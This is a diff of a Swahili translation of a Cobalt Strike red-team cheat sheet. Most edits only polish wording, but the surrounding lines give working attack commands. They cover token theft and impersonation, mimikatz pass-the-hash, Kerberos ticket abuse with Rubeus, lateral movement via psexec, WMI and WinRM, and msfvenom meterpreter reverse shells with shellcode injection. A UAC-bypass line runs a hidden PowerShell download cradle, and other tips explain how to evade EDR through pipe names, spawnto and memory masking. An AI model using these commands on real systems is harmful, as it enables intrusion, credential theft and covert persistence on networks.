@@ -6,7 +6,7 @@
 
 ### C2 Listeners
 
-`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua wapi kusikiliza, ni aina gani ya beacon ya kutumia (http, dns, smb...) na zaidi.
+`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua mahali pa kusikiliza, aina ya beacon ya kutumia (http, dns, smb...) na zaidi.
 
 ### Peer2Peer Listeners
 
@@ -14,8 +14,8 @@ Beacons za wasikilizaji hawa hazihitaji kuzungumza na C2 moja kwa moja, wanaweza
 
 `Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua TCP au SMB beacons
 
-* **Beacon ya **TCP itaanzisha msikilizaji katika bandari iliyochaguliwa**. Kuungana na beacon ya TCP tumia amri `connect <ip> <port>` kutoka beacon nyingine
-* **Beacon ya **smb itasikiliza katika pipename yenye jina lililochaguliwa**. Kuungana na beacon ya SMB unahitaji kutumia amri `link [target] [pipe]`.
+* **Beacon ya TCP itaanzisha msikilizaji katika bandari iliyochaguliwa**. Kuungana na beacon ya TCP tumia amri `connect <ip> <port>` kutoka beacon nyingine
+* **Beacon ya smb itasikiliza katika pipename yenye jina lililochaguliwa**. Kuungana na beacon ya SMB unahitaji kutumia amri `link [target] [pipe]`.
 
 ### Generate & Host payloads
 
@@ -65,6 +65,7 @@ powerpick <cmdlet> <args> # Hii inaunda mchakato wa dhabihu ulioainishwa na spaw
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # Hii inachoma UnmanagedPowerShell ndani ya mchakato ulioainishwa ili kuendesha cmdlet ya PowerShell.
 
+
 # User impersonation
 ## Token generation with creds
 make_token [DOMAIN\user] [password] #Unda token ili kuiga mtumiaji katika mtandao
@@ -80,7 +81,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Steal token from pid
 ## Kama make_token lakini kuiba token kutoka kwa mchakato
 steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, sio hatua za ndani
-## Kutoka kwa hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Imepitishwa <current_username> - inaimarisha token yetu iliyokopwa.
+## Kutoka kwenye hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Imepitishwa <current_username> - inaimarisha token yetu iliyokopwa.
 ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
 rev2self # Acha kutumia token kutoka steal_token
 
@@ -90,7 +91,7 @@ spawnas [domain\username] [password] [listener] #Fanya hivyo kutoka kwenye sarak
 
 ## Inject into process
 inject [pid] [x64|x86] [listener]
-## Kutoka kwa mtazamo wa OpSec: Usifanye kuingiza msalaba wa jukwaa isipokuwa ni lazima (mfano x86 -> x64 au x64 -> x86).
+## Kutoka kwa mtazamo wa OpSec: Usifanye kuingiza msalaba wa jukwaa isipokuwa ni lazima (mfano: x86 -> x64 au x64 -> x86).
 
 ## Pass the hash
 ## Mchakato huu wa mabadiliko unahitaji kubadilisha kumbukumbu ya LSASS ambayo ni hatua ya hatari kubwa, inahitaji ruhusa za admin za ndani na sio rahisi sana ikiwa Mchakato Uliolindwa Mwanga (PPL) umewezeshwa.
@@ -99,7 +100,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Bila /run, mimikatz inazalisha cmd.exe, ikiwa unakimbia kama mtumiaji mwenye Desktop, ataona shell (ikiwa unakimbia kama SYSTEM uko sawa)
+## Bila /run, mimikatz itazalisha cmd.exe, ikiwa unafanya kazi kama mtumiaji mwenye Desktop, ataona shell (ikiwa unafanya kazi kama SYSTEM uko sawa)
 steal_token <pid> #Iba token kutoka kwa mchakato ulioanzishwa na mimikatz
 
 ## Pass the ticket
@@ -108,7 +109,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Unda kikao kipya cha kuingia ili kutumia tiketi mpya (ili usifute ile iliyovunjwa)
 make_token <domain>\<username> DummyPass
-## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell & ipakie
+## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell & ipakue
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -141,15 +142,17 @@ jump [method] [target] [listener]
 ## winrm64                   x64   Endesha script ya PowerShell kupitia WinRM
 ## wmi_msbuild               x64   wmi lateral movement na msbuild inline c# task (oppsec)
 
+
 remote-exec [method] [target] [command] # remote-exec hairudishi matokeo
 ## Njia:
-## psexec                          Remote execute kupitia Meneja wa Udhibiti wa Huduma
+## psexec                          Remote execute kupitia Service Control Manager
 ## winrm                           Remote execute kupitia WinRM (PowerShell)
 ## wmi                             Remote execute kupitia WMI
 
 ## Ili kutekeleza beacon na wmi (haipo katika amri ya jump) pakua tu beacon na uitekeleze
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
+
 
 # Pass session to Metasploit - Through listener
 ## Kwenye mwenyeji wa metaploit
@@ -166,7 +169,7 @@ beacon> spawn metasploit
 # Pass session to Metasploit - Through shellcode injection
 ## Kwenye mwenyeji wa metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
-## Kimbia msfvenom na uandae msikilizaji wa multi/handler
+## Endesha msfvenom na uandae msikilizaji wa multi/handler
 
 ## Nakili faili ya bin kwenye mwenyeji wa cobalt strike
 ps
@@ -175,6 +178,7 @@ shinject <pid> x64 C:\Payloads\msf.bin #Ingiza shellcode ya metasploit katika mc
 # Pass metasploit session to cobalt strike
 ## Fenerate stageless Beacon shellcode, nenda kwa Attacks > Packages > Windows Executable (S), chagua msikilizaji unaotaka, chagua Raw kama aina ya Matokeo na chagua Tumia x64 payload.
 ## Tumia post/windows/manage/shellcode_inject katika metasploit kuingiza shellcode iliyozalishwa ya cobalt strike
+
 
 # Pivoting
 ## Fungua proxy ya socks katika teamserver
@@ -187,7 +191,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`** inatumia **mchakato wa dhabihu** kwa kutumia kuingiza mchakato wa mbali kutekeleza programu iliyoonyeshwa. Hii ni kelele sana kwani kuingiza ndani ya mchakato APIs fulani za Win zinatumika ambazo kila EDR inakagua. Hata hivyo, kuna zana za kawaida ambazo zinaweza kutumika kupakia kitu katika mchakato mmoja:
+**`execute-assembly`** inatumia **mchakato wa dhabihu** kwa kutumia kuingiza mchakato wa mbali kutekeleza programu iliyoonyeshwa. Hii ni kelele sana kwani kuingiza ndani ya mchakato baadhi ya Win APIs zinatumika ambazo kila EDR inakagua. Hata hivyo, kuna zana za kawaida ambazo zinaweza kutumika kupakia kitu katika mchakato sawa:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
@@ -202,24 +206,24 @@ Unaweza kuangalia matukio kama `Seatbelt.exe LogonEvents ExplicitLogonEvents Pow
 
 - Usalama EID 4624 - Angalia kila kuingia kwa mwingiliano ili kujua masaa ya kawaida ya kufanya kazi.
 - Mfumo EID 12,13 - Angalia mara za kuzima/kuzindua/usingizi.
-- Usalama EID 4624/4625 - Angalia majaribio halali/siyo halali ya NTLM.
+- Usalama EID 4624/4625 - Angalia majaribio halali/asiye halali ya NTLM.
 - Usalama EID 4648 - Tukio hili linaundwa wakati akidi za maandiko zinapotumika kuingia. Ikiwa mchakato umeunda, binary ina uwezekano wa kuwa na akidi hizo wazi katika faili ya usanidi au ndani ya msimbo.
 
 Unapotumia `jump` kutoka cobalt strike, ni bora kutumia njia ya `wmi_msbuild` ili kufanya mchakato mpya uonekane halali zaidi.
 
 ### Use computer accounts
 
-Ni kawaida kwa walinzi kuangalia tabia za ajabu zinazozalishwa kutoka kwa watumiaji na **kuondoa akaunti za huduma na akaunti za kompyuta kama `*$` kutoka kwa ufuatiliaji wao**. Unaweza kutumia akaunti hizi kufanya harakati za pembeni au kupandisha hadhi.
+Ni kawaida kwa walinzi kuangalia tabia za ajabu zinazozalishwa na watumiaji na **kuondoa akaunti za huduma na akaunti za kompyuta kama `*$` kutoka kwa ufuatiliaji wao**. Unaweza kutumia akaunti hizi kufanya harakati za pembeni au kupandisha hadhi.
 
 ### Use stageless payloads
 
-Stageless payloads ni kelele kidogo kuliko zile zilizopangwa kwa sababu hazihitaji kupakua hatua ya pili kutoka kwa seva ya C2. Hii inamaanisha kwamba hazizalishi trafiki yoyote ya mtandao baada ya muunganisho wa awali, na kufanya kuwa na uwezekano mdogo wa kugunduliwa na ulinzi wa mtandao.
+Stageless payloads ni kelele kidogo kuliko zilizopangwa kwa sababu hazihitaji kupakua hatua ya pili kutoka kwa seva ya C2. Hii inamaanisha kwamba hazizalishi trafiki yoyote ya mtandao baada ya muunganisho wa awali, na kufanya kuwa na uwezekano mdogo wa kugunduliwa na ulinzi wa mtandao.
 
 ### Tokens & Token Store
 
 Kuwa makini unapoiba au kuunda tokens kwa sababu inaweza kuwa inawezekana kwa EDR kuorodhesha tokens zote za nyuzi zote na kupata **token inayomilikiwa na mtumiaji tofauti** au hata SYSTEM katika mchakato.
 
-Hii inaruhusu kuhifadhi tokens **kwa beacon** ili sio lazima kuiba token hiyo tena na tena. Hii ni muhimu kwa harakati za pembeni au unapohitaji kutumia token iliyibwa mara nyingi:
+Hii inaruhusu kuhifadhi tokens **kwa beacon** ili sio lazima kuiba token hiyo tena na tena. Hii ni muhimu kwa harakati za pembeni au unapohitaji kutumia token iliyopatikana mara nyingi:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -228,7 +232,7 @@ Hii inaruhusu kuhifadhi tokens **kwa beacon** ili sio lazima kuiba token hiyo te
 - token-store remove <id>
 - token-store remove-all
 
-Unapohamisha kwa pembeni, kawaida ni bora **kuiba token kuliko kuunda mpya** au kufanya shambulio la kupitisha hash.
+Unapohamia kwa pembeni, kawaida ni bora **kuiba token kuliko kuunda mpya** au kufanya shambulio la kupitisha hash.
 
 ### Guardrails
 
@@ -246,33 +250,33 @@ Unapotumia Cobalt Strike kwa kawaida mabomba ya SMB yatakuwa na jina `msagent_##
 
 Zaidi ya hayo, na vikao vya SSH bomba linaloitwa `\\.\pipe\postex_ssh_####` linaanzishwa. Badilisha kwa `set ssh_pipename "<new_name>";`.
 
-Pia katika shambulio la baada ya unyakuzi mabomba `\\.\pipe\postex_####` yanaweza kubadilishwa kwa `set pipename "<new_name>"`.
+Pia katika shambulio la poext exploitation mabomba `\\.\pipe\postex_####` yanaweza kubadilishwa kwa `set pipename "<new_name>"`.
 
 Katika profaili za Cobalt Strike unaweza pia kubadilisha mambo kama:
 
 - Kuepuka kutumia `rwx`
 - Jinsi tabia ya kuingiza mchakato inavyofanya kazi (ni APIs zipi zitakazotumika) katika block ya `process-inject {...}`
 - Jinsi "fork and run" inavyofanya kazi katika block ya `post-ex {…}`
-- Wakati wa kulala
-- Ukubwa wa juu wa binaries zinazoweza kupakiwa kwenye kumbukumbu
+- Wakati wa usingizi
+- Ukubwa wa juu wa binaries zinazopaswa kupakiwa kwenye kumbukumbu
 - Alama ya kumbukumbu na maudhui ya DLL na block ya `stage {...}`
 - Trafiki ya mtandao
 
 ### Bypass memory scanning
 
-Baadhi ya ERDs zinakagua kumbukumbu kwa baadhi ya saini za malware zinazojulikana. Coblat Strike inaruhusu kubadilisha kazi ya `sleep_mask` kama BOF ambayo itakuwa na uwezo wa kusimbua katika kumbukumbu backdoor.
+Baadhi ya EDRs zinakagua kumbukumbu kwa baadhi ya saini za malware zinazojulikana. Coblat Strike inaruhusu kubadilisha kazi ya `sleep_mask` kama BOF ambayo itakuwa na uwezo wa kusimbua katika kumbukumbu backdoor.
 
 ### Noisy proc injections
 
-Wakati wa kuingiza msimbo katika mchakato hii kawaida huwa na kelele nyingi, hii ni kwa sababu **hakuna mchakato wa kawaida unafanya hatua hii na kwa sababu njia za kufanya hivyo ni chache sana**. Hivyo, inaweza kugunduliwa na mifumo ya kugundua inayotegemea tabia. Aidha, inaweza pia kugunduliwa na EDRs zinazoangalia mtandao kwa **nyuzi zinazoshikilia msimbo ambao haupo kwenye diski** (ingawa michakato kama vivinjari vinavyotumia JIT vina hii kawaida). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Wakati wa kuingiza msimbo katika mchakato hii kwa kawaida ni kelele sana, hii ni kwa sababu **hakuna mchakato wa kawaida kwa kawaida unafanya hatua hii na kwa sababu njia za kufanya hivyo ni chache sana**. Hivyo, inaweza kugunduliwa na mifumo ya kugundua inayotegemea tabia. Aidha, inaweza pia kugunduliwa na EDRs zinazoskania mtandao kwa **nyuzi zinazojumuisha msimbo ambao haupo kwenye diski** (ingawa michakato kama vivinjari vinavyotumia JIT vina hii kawaida). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID and PPID relationships
 
 Wakati wa kuanzisha mchakato mpya ni muhimu **kuhifadhi uhusiano wa kawaida wa mzazi-na-mwana** kati ya michakato ili kuepuka kugunduliwa. Ikiwa svchost.exec inatekeleza iexplorer.exe itakuwa na shaka, kwani svchost.exe si mzazi wa iexplorer.exe katika mazingira ya kawaida ya Windows.
 
-Wakati beacon mpya inazalishwa katika Cobalt Strike kwa kawaida mchakato unaotumia **`rundll32.exe`** unaundwa ili kuendesha msikilizaji mpya. Hii si stealthy sana na inaweza kugunduliwa kwa urahisi na EDRs. Zaidi ya hayo, `rundll32.exe` inakimbia bila args yoyote ikifanya kuwa na shaka zaidi.
+Wakati beacon mpya inazalishwa katika Cobalt Strike kwa kawaida mchakato unaotumia **`rundll32.exe`** unaundwa ili kuendesha msikilizaji mpya. Hii si stealthy sana na inaweza kugunduliwa kwa urahisi na EDRs. Zaidi ya hayo, `rundll32.exe` inatekelezwa bila args yoyote ikifanya kuwa na shaka zaidi.
 
-Kwa amri ifuatayo ya Cobalt Strike, unaweza kubainisha mchakato tofauti ili kuanzisha beacon mpya, na kuifanya iwe ngumu kugundua:
+Kwa amri ifuatayo ya Cobalt Strike, unaweza kuainisha mchakato tofauti ili kuanzisha beacon mpya, na kuifanya iwe ngumu kugundua:
 ```bash
 spawnto x86 svchost.exe
 ```
@@ -280,11 +284,11 @@ You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile
 
 ### Proxying attackers traffic
 
-Wakati mwingine washambuliaji watahitaji kuwa na uwezo wa kuendesha zana kwa ndani, hata kwenye mashine za linux na kufanya trafiki ya waathirika ifikie zana (kwa mfano, NTLM relay).
+Wakati mwingine washambuliaji watahitaji kuwa na uwezo wa kuendesha zana kwa ndani, hata kwenye mashine za linux na kufanya trafiki ya waathirika ifikie zana (e.g. NTLM relay).
 
-Zaidi ya hayo, wakati mwingine kufanya shambulio la pass-the-hash au pass-the-ticket ni rahisi zaidi kwa mshambuliaji **kuongeza hash hii au tiketi katika mchakato wake wa LSASS** kwa ndani na kisha kuhamasisha kutoka hapo badala ya kubadilisha mchakato wa LSASS wa mashine ya mwathirika.
+Zaidi ya hayo, wakati mwingine kufanya shambulio la pass-the.hash au pass-the-ticket ni rahisi zaidi kwa mshambuliaji **kuongeza hash hii au tiketi katika mchakato wake wa LSASS** kwa ndani na kisha pivot kutoka kwake badala ya kubadilisha mchakato wa LSASS wa mashine ya waathirika.
 
-Hata hivyo, unahitaji kuwa **makini na trafiki inayozalishwa**, kwani unaweza kuwa unatumia trafiki isiyo ya kawaida (kerberos?) kutoka kwa mchakato wako wa backdoor. Kwa hili unaweza kuhamasisha kwenye mchakato wa kivinjari (ingawa unaweza kukamatwa ukiingiza mwenyewe kwenye mchakato hivyo fikiria njia ya siri ya kufanya hivi).
+Hata hivyo, unahitaji kuwa **makini na trafiki inayozalishwa**, kwani unaweza kuwa unatumia trafiki isiyo ya kawaida (kerberos?) kutoka kwa mchakato wako wa backdoor. Kwa hili unaweza pivot kwa mchakato wa kivinjari (ingawa unaweza kukamatwa ukiingiza mwenyewe katika mchakato hivyo fikiria njia ya siri ya kufanya hivi).
 ```bash
 
 ### Avoiding AVs
@@ -292,6 +296,7 @@ Hata hivyo, unahitaji kuwa **makini na trafiki inayozalishwa**, kwani unaweza ku
 #### AV/AMSI/ETW Bypass
 
 Check the page:
+
 
 {{#ref}}
 av-bypass.md
